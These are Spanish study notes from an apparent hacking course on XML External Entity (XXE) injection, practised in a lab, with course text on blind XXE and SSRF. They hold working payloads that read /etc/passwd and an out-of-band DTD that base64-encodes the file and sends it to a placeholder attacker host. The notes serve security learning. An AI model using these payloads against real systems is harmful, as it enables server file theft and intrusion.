## Mis apuntes: 

Para esto tenemos que montar el laboratorio, en el cual podremos practicar todo lo que es XXE: 
Para ver como viajan las peticiones por detrás podemos utilizar burpsuite para entender de mejor manera las cosas: 

![[Pasted image 20240226152901.png]]
bueno dentro de las xml tenemos que saber que hay entridades, que son un elemento de los datos, estos no referencian a los datos como tal, todo ello en un documento xml
hay algunos tipos de entidades, Genericas/customizadas, externas (XXE), predefinidas (&lt;, &gt;)
```
<?xml version="1.0" encodig="UTF-8"> -> Declaracion XML
<!DOCTYPE foo [<!ENTITY xxe system "miEntidad">]> ->DTD(Document Type Definition)
<Profesores>
	<nombre>S4vitar</nombre>
	<edad>27</edad>
	<Rol>Lammer</Rol>
</Hack4u>	
```
en el ejemplo del laboratorio tenemos una estructura tal que así: 
![[Pasted image 20240226154040.png]]
para poder cambiar el output que representa, podemos jugar con entidades, de la siguiente forma: 
![[Pasted image 20240226154811.png]]
creamos un doctype, la entidad se llama myName y contiene el dato gonza.
 ![[Pasted image 20240226154942.png]]
 si hacemos la llamada de la entidad podemos ver que el output cambia y nos representa el nombre que pusimos en la entidad: 
 ![[Pasted image 20240226155022.png]]
 ahora para llevarlo al siguiente nivel podemos llamar a archivos del sistema para que salgan en el output: 
 ![[Pasted image 20240226155432.png]]
 podemos ver que modificamos la entidad para que nos muestre el archivo /etc/passwd y nos muestra el etc/passwd de la maquina victima.
 Hay casos en el que el output no necesariamente salga dentro de la pagina, por lo que hay que aplicar otro tipo de entidades. 
 Estas se llaman External DTD(XXE OOB)
```
EXTERNAL DTD (XXE OOB)
<?xml version="1.0" encodig="UTF-8"> -> Declaracion XML
<!DOCTYPE foo [<!ENTITY xxe system "http://ipatacante/malicious.dtd"> %xxe;]> ->DTD(Document Type Definition)
<Profesores>
	<nombre>S4vitar</nombre>
	<edad>27</edad>
	<Rol>Lammer</Rol>
</Hack4u>	
MALICIOUS.DTD: 
<!ENTITY %file SYSTEM "php://filter/convert.base64-encode/resouce=/etc/passwd">
<!ENTITY %eval "<!ENTITY &#x25; exfil SYSTEM 'http://ipatacante/?file=%file;'>">
%eval;
%exfil;
```
en esta parte del ejemplo podemos ver que se crea la entidad pero no se muestra en pantalla el resultado de este: 
![[Pasted image 20240226204241.png]]
pero podemos hacer la llamada dentro de propio dtd: 
![[Pasted image 20240226210017.png]]
y si tenemos abierto un servidor en el puerto 80 podemos ver que esta consulta nuestro script: 
![[Pasted image 20240226210204.png]]
ahora podemos cambiar el nombre de los archivos y entidades para poder jugar con los scripts que estimemos conveniente ocupar. 
en este caso cambiaremos los nombres de myFile por xxe y el archivo a malicious.dtd. 
![[Pasted image 20240226211748.png]]
el script que estamos llamando es el siguiente: 
![[Pasted image 20240226211844.png]]
donde en la entidad file, convierte el /etc/passwd en base64, lo exporta a mi servidor a través de la entidad eval, que contiene la entidad exfil que muestra el contenido de la entidad file.
La respuesta que va al servidor es la siguiente: 
![[Pasted image 20240226212031.png]]
si hacemos un echo -n | base64 -d; echo veremos lo siguiente:
![[Pasted image 20240227003002.png]]







----
## Datos del curso: 

Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

- **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)